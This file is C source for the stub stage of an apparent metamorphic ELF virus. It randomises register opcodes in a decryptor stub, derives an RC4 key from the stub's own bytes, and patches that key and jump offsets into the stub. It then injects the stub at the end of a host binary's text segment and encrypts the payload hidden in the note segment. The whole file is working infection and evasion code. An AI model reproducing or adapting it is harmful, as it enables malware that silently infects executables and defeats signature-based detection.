#include <war.h>

////////////////////////////////////////////////////////////////////////////////
/// STATIC FUNCTIONS
////////////////////////////////////////////////////////////////////////////////

__attribute__((always_inline)) static inline void metamorph_stub(void)
{
	char *stub;
	unsigned short opcode;

	const struct s_metamorph metamorph =
	{
		{RAX, RDI, RSI, RDX, RCX},
		{OFFSET_1, OFFSET_2, OFFSET_3, OFFSET_4, OFFSET_5, OFFSET_6, OFFSET_7, OFFSET_8, OFFSET_9, OFFSET_A},
	};


	stub = (char *)L1;

	for (register size_t index = 0; index < OFFS_SIZE; index++)
	{
		opcode = metamorph.code[_get_random_integer(CODE_SIZE)];

		_memcpy(stub + metamorph.offset[index], &opcode, sizeof(unsigned short));
	}
}

__attribute__((always_inline)) static inline void generate_key(unsigned char *key)
{
	char *stub = (char *)L1;
	const size_t stub_size = (void *)__exit - (void *)L1;

	_bzero((char *)key, DEFAULT_KEY_SIZE);

	for (register size_t index = 0; index < stub_size; index++)
	{
		key[index % DEFAULT_KEY_SIZE] += stub[index];
	}
}

__attribute__((always_inline)) static inline void patch_stub(const unsigned char *key)
{
	char *stub = (char *)L1 + KEY_OFFSET;

	for (register size_t index = 0; index < DEFAULT_KEY_SIZE; index++)
	{
		*(unsigned char *)stub = key[index];
		stub += JUMP_SIZE;
	}
}

__attribute__((always_inline)) static inline void insert_stub(char *dst, Elf64_Phdr **segment)
{
	char *stub = (char *)L1;
	const size_t stub_size = (void *)__exit - (void *)L1;

	const size_t patch_address = segment[NOTE]->p_vaddr - ((segment[TEXT]->p_vaddr + segment[TEXT]->p_memsz) - (stub_size - (ADDR_OFFSET + JUMP_SIZE)));
	const size_t patch_size = ((void *)__exit - (void *)__entry) + FCNT_SIZE;
	const size_t patch_jump = segment[NOTE]->p_vaddr - ((segment[TEXT]->p_vaddr + segment[TEXT]->p_memsz));

	const size_t size = sizeof(int);

	_memcpy(stub + ADDR_OFFSET, &patch_address, size);
	_memcpy(stub + SIZE_OFFSET, &patch_size, size);
	_memcpy(stub + (stub_size - JUMP_SIZE), &patch_jump, size);

	_memcpy(dst + ((segment[TEXT]->p_offset + segment[TEXT]->p_filesz) - stub_size), stub, stub_size);
}

////////////////////////////////////////////////////////////////////////////////
/// PUBLIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

void stub(struct s_host *host, struct s_keychain *keychain, enum e_context context, struct s_injection *injection)
{

#if LOGGER
	MID_LOGGER("stub:\t\t\t");
#endif

	if (context == FAILURE)
		goto label;

	unsigned char key[DEFAULT_KEY_SIZE];

	metamorph_stub();
	generate_key(key);
	patch_stub(key);
	insert_stub(injection->ptr, host->segment);

	RC4(key, DEFAULT_KEY_SIZE, injection->ptr + host->segment[NOTE]->p_offset, ((void *)__exit - (void *)__entry) + FCNT_SIZE);

label:
	clean(host, keychain, context, injection);
}
